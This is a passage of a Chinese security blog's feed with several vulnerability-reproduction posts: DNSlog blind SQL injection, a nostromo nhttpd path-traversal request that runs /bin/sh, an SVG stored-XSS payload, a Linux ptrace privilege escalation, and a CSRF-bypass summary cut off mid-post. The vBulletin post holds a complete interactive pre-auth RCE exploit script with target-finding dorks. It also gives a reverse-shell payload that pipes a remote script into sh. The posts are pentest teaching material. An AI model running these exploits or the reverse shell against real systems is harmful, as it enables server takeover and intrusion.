class="line"></span><br><span class="line">select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263));</span><br></pre></td></tr></table></figure></li><li><p>复现如下图：</p><p>  <a href="https://imgchr.com/i/K1jCL9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jCL9.png" alt="K1jCL9.png"></a><br>  <a href="https://imgchr.com/i/K1jpM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jpM4.png" alt="K1jpM4.png"></a><br>  <a href="https://imgchr.com/i/K1j9sJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1j9sJ.png" alt="K1j9sJ.png"></a></p></li></ul></li></ul><h2><span id="0x04-reference">0X04 Reference</span></h2><pre><code>- 参考链接：    https://xz.aliyun.com/t/3992#toc-1    https://www.freebuf.com/articles/web/201013.html    https://www.t00ls.net/thread-44273-1-1.html</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-为什么用dnslog盲注&quot;&gt;0x00 为什么用Dnslog盲注&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-利用条件&quot;&gt;0x01 利用条件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>nostromo nhttpd 路径遍历漏洞</title>
    <link href="http://www.vkxss.top/2019/10/17/CVE-2019-16278/"/>
    <id>http://www.vkxss.top/2019/10/17/CVE-2019-16278/</id>
    <published>2019-10-17T07:30:08.000Z</published>
    <updated>2019-10-17T07:32:00.814Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞描述">0X04 漏洞描述</a></li><li><a href="#0x05-漏洞poc">0X05 漏洞POC</a></li><li><a href="#0x06-漏洞复现">0X06 漏洞复现</a></li><li><a href="#0x07-修复建议">0X07 修复建议</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li><font face="微软雅黑">nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</font></li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li><font face="微软雅黑">CVE-2019-16278</font></li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li>nostromo nhttpd &lt;= 1.9.6</li></ul><h2><span id="0x04-漏洞描述">0X04 漏洞描述</span></h2><ul><li><font face="微软雅黑">nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</font></li></ul><h2><span id="0x05-漏洞poc">0X05 漏洞POC</span></h2><ul><li><p>CVE-2019-16278.sh</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">   echo</span><br><span class="line">   echo</span><br><span class="line">   ifconfig 2&gt;&amp;1</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x06-漏洞复现">0X06 漏洞复现</span></h2><ul><li><p>记录一下，请参考：</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278</a></li></ul></li></ul><h2><span id="0x07-修复建议">0X07 修复建议</span></h2><ul><li><font face="微软雅黑">上waf或防火墙配置规则拦截,等待官方修复打补丁。</font></li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li><p>参考链接：</p><ul><li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807</a></li><li><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16278" scheme="http://www.vkxss.top/tags/CVE-2019-16278/"/>
    
  </entry>
  
  <entry>
    <title>SVG-XSS</title>
    <link href="http://www.vkxss.top/2019/10/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS/"/>
    <id>http://www.vkxss.top/2019/10/11/渗透测试-SVG-XSS/</id>
    <published>2019-10-11T07:30:08.000Z</published>
    <updated>2019-10-11T10:38:58.307Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#svg-xss">SVG-XSS</a><ul><li><a href="#介绍">介绍</a></li><li><a href="#svg文件">SVG文件</a></li><li><a href="#xss-payload">Xss Payload</a></li></ul></li></ul><!-- tocstop --><h1><span id="svg-xss">SVG-XSS</span></h1><h2><span id="介绍">介绍</span></h2><ul><li>跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。</li></ul><h2><span id="svg文件">SVG文件</span></h2><ul><li><p>可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。</p></li><li><p>以下代码是基本SVG文件的示例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。</p></li><li><p>要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="xss-payload">Xss Payload</span></h2><ul><li><p>如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    alert(&quot;SVG XSS&quot;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>上传时，注意内容类型设置为：Content-Type: image/svg+xml</p></li><li><p>上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H0dbdab236e1c460ebd3f3fe412c09d94k.png" style="zoom:50%"></center></font></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#svg-xss&quot;&gt;SVG-XSS&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#svg文件&quot;&gt;SVG文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#xs
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>接口快速测试小技巧(Python)</title>
    <link href="http://www.vkxss.top/2019/10/11/Python-%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)/"/>
    <id>http://www.vkxss.top/2019/10/11/Python-接口快速测试小技巧(Python)/</id>
    <published>2019-10-11T07:30:08.000Z</published>
    <updated>2019-11-15T09:10:30.260Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="接口快速测试小技巧python">接口快速测试小技巧(Python)</span></h2><ul><li><p><font face="微软雅黑">终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺</font></p></li><li><p><font face="微软雅黑">网站：<a href="https://curl.trillworks.com" target="_blank" rel="noopener">https://curl.trillworks.com</a></font></p><p>  <a href="https://imgchr.com/i/KieFSA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieFSA.png" alt="KieFSA.png"></a></p><p>  <a href="https://imgchr.com/i/KieEOP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieEOP.png" alt="KieEOP.png"></a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;接口快速测试小技巧python&quot;&gt;接口快速测试小技巧(Python)&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，
      
    
    </summary>
    
    
      <category term="Python" scheme="http://www.vkxss.top/categories/Python/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-13272-Linux本地提权漏洞</title>
    <link href="http://www.vkxss.top/2019/10/08/CVE-2019-13272/"/>
    <id>http://www.vkxss.top/2019/10/08/CVE-2019-13272/</id>
    <published>2019-10-08T07:30:08.000Z</published>
    <updated>2019-10-09T08:00:57.618Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#漏洞概述">漏洞概述：</a></li><li><a href="#影响范围">影响范围</a></li><li><a href="#复现环境">复现环境</a></li><li><a href="#漏洞复现">漏洞复现</a></li></ul><!-- tocstop --><h2><span id="漏洞概述">漏洞概述：</span></h2><ul><li><p>当调用PTRACE_TRACEME时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数。但是，对象struct cred的生存周期规则不允许无条件地将RCU引用转换为稳定引用。</p></li><li><p>PTRACE_TRACEME获取父进程的凭证，使其能够像父进程一样执行父进程能够执行的各种操作。如果恶意低权限子进程使用PTRACE_TRACEME并且该子进程的父进程具有高权限，该子进程可获取其父进程的控制权并且使用其父进程的权限调用execve函数创建一个新的高权限进程。攻击者最终控制具有高权限的两个进程ptrace关系，可以被用来ptrace，suid二进制文件并获得root权限。</p></li></ul><h2><span id="影响范围">影响范围</span></h2><ul><li>目前受影响的Linux内核版本：<ul><li>Linux Kernel &lt; 5.1.17</li></ul></li></ul><h2><span id="复现环境">复现环境</span></h2><ul><li><p>exploit下载地址：</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272</a></li></ul></li><li><p>Ubuntu 4.13.0-38-generic</p></li><li><p>Kali未复现成功，普通用户执行gcc，提示权限不够</p></li></ul><h2><span id="漏洞复现">漏洞复现</span></h2><ul><li>利用效果如下图:<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H12304057103645d3ba5553aa6f065726i.png" style="zoom:50%"></center></font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#漏洞概述&quot;&gt;漏洞概述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#影响范围&quot;&gt;影响范围&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#复现环境&quot;&gt;复现环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#漏洞复现
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="Linux本地提取" scheme="http://www.vkxss.top/tags/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>vBulletin 5.x 前台远程代码执行漏洞复现</title>
    <link href="http://www.vkxss.top/2019/09/25/CVE-2019-16759/"/>
    <id>http://www.vkxss.top/2019/09/25/CVE-2019-16759/</id>
    <published>2019-09-25T07:30:08.000Z</published>
    <updated>2019-09-25T16:45:55.068Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞描述">0X04 漏洞描述</a></li><li><a href="#0x05-漏洞poc">0X05 漏洞POC</a></li><li><a href="#0x06-漏洞复现">0X06 漏洞复现</a></li><li><a href="#0x07-修复建议">0X07 修复建议</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li>vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。</li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li>CVE-2019-16759</li><li>相关信息链接：<a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li>CVE-2019-16759漏洞影响：vBulletin 5.0.0 到最新 5.5.4版本</li></ul><h2><span id="0x04-漏洞描述">0X04 漏洞描述</span></h2><ul><li>漏洞通过请求ajax/render/widget_php进行模板注入触发代码执行。</li></ul><h2><span id="0x05-漏洞poc">0X05 漏洞POC</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#</span><br><span class="line"># vBulletin 5.x 0day pre-auth RCE exploit</span><br><span class="line"># </span><br><span class="line"># This should work on all versions from 5.0.0 till 5.5.4</span><br><span class="line">#</span><br><span class="line"># Google Dorks:</span><br><span class="line"># - site:*.vbulletin.net</span><br><span class="line"># - &quot;Powered by vBulletin Version 5.5.4&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])</span><br><span class="line"></span><br><span class="line">params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">     try:</span><br><span class="line">          cmd = raw_input(&quot;vBulletin$ &quot;)</span><br><span class="line">          params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot;</span><br><span class="line">          r = requests.post(url = sys.argv[1], data = params)</span><br><span class="line">          if r.status_code == 200:</span><br><span class="line">               print r.text</span><br><span class="line">          else:</span><br><span class="line">               sys.exit(&quot;Exploit failed! :(&quot;)</span><br><span class="line">     except KeyboardInterrupt:</span><br><span class="line">          sys.exit(&quot;\nClosing shell...&quot;)</span><br><span class="line">     except Exception, e:</span><br><span class="line">          sys.exit(str(e))</span><br></pre></td></tr></table></figure><h2><span id="0x06-漏洞复现">0X06 漏洞复现</span></h2><ul><li><p>漏洞地址：</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H243ff923b53b4679a8702a6009b941b9f.jpg" style="zoom:30%"></center></font></p></li><li><p>访问漏洞URL，修改请求方式为POST：</p><p>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H21d8a202c5e54ce0ab3bf74ffac27aa5O.jpg" style="zoom:30%"></center></font></p></li><li><p>然后在post参数中可输入以下任意payload验证：</p><ul><li><p>payload1：widgetConfig[code] = echo shell_exec(‘id’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/He0f05a02b58e463ca5a05d3023d36e21P.jpg" style="zoom:30%"></center></font></p></li><li><p>payload2：widgetConfig[code] = echo shell_exec(‘whoami’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H5c043157723a4bf58a3f908ad01e0e5ci.jpg" style="zoom:30%"></center></font></p></li><li><p>payload3：widgetConfig[code] = echo shell_exec(‘uname-a’);<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hd4a1783bda814bcc84064f03d41ffc7fs.jpg" style="zoom:30%"></center></font></p></li><li><p>payload4：widgetConfig[code] = echo shell_exec(‘curl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | sh’);</p></li><li><p>注意使用payload4反弹shell，参考如下：</p><ul><li><p>Reverse Shell as a Service</p><ul><li><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></li></ul></li><li><p>在你的机器：nc -l 1337<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H6e9006224f994e6dbb970bda9f3fd112J.jpg" style="zoom:30%"></center></font></p></li><li><p>在目标机器上：curl <a href="https://shell.now.sh/yourip:1337" target="_blank" rel="noopener">https://shell.now.sh/yourip:1337</a> | sh<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H776be97db07f4e419dc90d6cece7f660E.jpg" style="zoom:30%"></center></font></p></li><li><p>反弹Shell会话<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Heb0bebfb2fa04d7e88703a212246ea1df.jpg" style="zoom:30%"></center></font></p></li></ul></li></ul></li></ul><h2><span id="0x07-修复建议">0X07 修复建议</span></h2><ul><li>上waf或防火墙配置规则拦截,等待官方修复打补丁。</li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li>参考链接：<a href="https://www.youtube.com/watch?v=ymLRqsbCuVY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ymLRqsbCuVY</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16759" scheme="http://www.vkxss.top/tags/CVE-2019-16759/"/>
    
  </entry>
  
  <entry>
    <title>绕过CSRF防御总结</title>
    <link href="http://www.vkxss.top/2019/09/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BB%95%E8%BF%87CSRF%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/09/19/渗透测试-绕过CSRF防御总结/</id>
    <published>2019-09-19T07:30:08.000Z</published>
    <updated>2019-11-13T02:53:44.726Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#一-先了解下csrf_token">一、 先了解下CSRF_TOKEN</a><ul><li><a href="#1-什么是csrf_token">1. 什么是CSRF_TOKEN</a></li><li><a href="#2-为什么csrf-token可以写在cookie里">2. 为什么CSRF-Token可以写在COOKIE里</a></li><li><a href="#3-常见csrf_token使用方式有两种">3. 常见csrf_token使用方式有两种：</a><ul><li><a href="#31-synchronizer-token-patternstp">3.1 Synchronizer token pattern(STP)</a></li><li><a href="#32-cookie-to-header-token">3.2 Cookie-to-header token</a></li></ul></li></ul></li><li><a href="#二-绕过csrf防御总结">二、绕过CSRF防御总结</a><ul><li><a href="#21-所有的csrf">2.1 所有的CSRF</a><ul><li><a href="#211-点击劫持">2.1.1 点击劫持</a></li><li><a href="#212-更改请求方法">2.1.2 更改请求方法</a></li></ul></li></ul></li><li><a href="#三-csrf-token的防御措施">三 、CSRF token的防御措施</a><ul><li><a href="#31-删除token参数或发送空token">3.1 删除token参数或发送空token</a></li><li><a href="#32-使用另一个session的csrf-token">3.2 使用另一个session的CSRF token</a></li><li><a href="#33-session固定">3.3 Session固定</a></li><li><a href="#34-通过xss获取csrf_token">3.4 通过XSS获取csrf_token</a></li><li><a href="#35-jsonp劫持获取csrf_token">3.5 Jsonp劫持获取csrf_token</a></li></ul></li><li><a href="#四-referer字段的csrf防御">四、 Referer字段的CSRF防御</a><ul><li><a href="#41-referer值为空或移除referer字段">4.1 Referer值为空或移除referer字段</a></li><li><a href="#42-自建服务器路径带referer字段名">4.2 自建服务器路径带referer字段名</a></li><li><a href="#43-利用url跳转">4.3 利用URL跳转</a></li><li><a href="#43-绕过正则表达式">4.3 绕过正则表达式</a></li></ul></li></ul><!-- tocstop --><h2><span id="一-先了解下csrf_token">一、 先了解下CSRF_TOKEN</span></h2><h3><span id="1-什么是csrf_token">1. 什么是CSRF_TOKEN</span></h3><ul><li>就是防止跨站请求伪造（CSRF）的</li></ul><h3><span id="2-为什么csrf-token可以写在cookie里">2. 为什么CSRF-Token可以写在COOKIE里</span></h3><ul><li><p>将csrf令牌写入Cookie，是因为：<br>服务器进行csrf防御校验的时候，是拿用户http请求体中的token参数值和cookie中的csrftoken值进行比对。<br>如果值一样了，操作才被允许执行。</p></li><li><p>因为同源策略的限制，当正常用户通过账号密码等方式登陆网站A后，在不注销账号或当前COOKIE失效之前，再次访问网站A时（协议、IP、端口号相同则属于同源）浏览器会自动在HTTP请求包中带上该网站用户登陆后的COOKIE信息。这也就是为什么同源策略无法防御csrf的原因。</p></li><li><p>也就是说我们对CSRF的理解应为：攻击者借用用户COOKIE执行非用户本意的操作。</p></li><li><p>在此攻击过程中用户COOKIE对于攻击者来说是不可见的是未知的、不可见的，攻击者能做到仅仅是借用COOKIE，而COOKIE里面具体写了什么，攻击者是不知道的。又因为COOKIE里的信息对于攻击者来说是不可预知的，无法伪造的，所以将CSRF-TOKEN写在COOKIE中符合就CSRF防御思想中的不可预知原则。</p></li></ul><h3><span id="3-常见csrf_token使用方式有两种">3. 常见csrf_token使用方式有两种：</span></h3><h4><span id="31-synchronizer-token-patternstp">3.1 Synchronizer token pattern(STP)</span></h4><ul><li>对于每个request，在服务器端生成一个新的csrf_token，并将其返回在页面的表单中。在服务器端每次接收到请求时，都会验证表单中是否包含正确的csrf_token。由于第三方网站无法得知正确的csrf_token，所以无法进行csrf攻击。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get_token = get_random_token()</span><br><span class="line"> return &#123;</span><br><span class="line">   &lt;form&gt;</span><br><span class="line">     &lt;input name=field1&gt;&lt;/input&gt;</span><br><span class="line">     &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这个方法的好处是客户端不需要支持javascript，因此通用于所有的网站。坏处是由于服务器端对于每个请求都会更换csrf_token，因此他需要保证用户提交的表单是用户最近一次请求的表单。如果用户通过多个tab同时浏览该网站，那么往往会导致用户提交的表单不是最新的那一个。</li></ul><h4><span id="32-cookie-to-header-token">3.2 Cookie-to-header token</span></h4><ul><li>第二个方法是为每个session生成一个csrf_token，随后将csrf_token保存到cookie中，之后通过javascript在每次请求时将csrf_token设置到http header中的X-Csrf-Token属性中。再在服务器端比较Cookie的csrf_token与header中的token是否一致。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//当用户登录时设置Cookie</span><br><span class="line">Set-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/</span><br><span class="line"></span><br><span class="line">//当用户发送请求时设置Http Header中的X-Csrf-Token</span><br><span class="line">X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</span><br></pre></td></tr></table></figure><h2><span id="二-绕过csrf防御总结">二、绕过CSRF防御总结</span></h2><ul><li><p>注：原文链接：<a href="https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网）" target="_blank" rel="noopener">https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网）</a></p></li><li><p>CSRF漏洞很容易就可以被发现并利用。一眼看去很多站点好像在这方面都做得不错：当你检查针对敏感操作的请求时，他们往往会实施CSRF保护。有时候可能是一个在请求主体中的CSRF token，也有可能是一个referer字段检测，或者有时是一个特殊的HTTP头字段或者cookie字段。</p></li><li><p>但是CSRF的防御不代表它就不可以被绕过。今天我们讨论一些我如何绕过CSRF防御措施的技术。</p></li></ul><h3><span id="21-所有的csrf">2.1 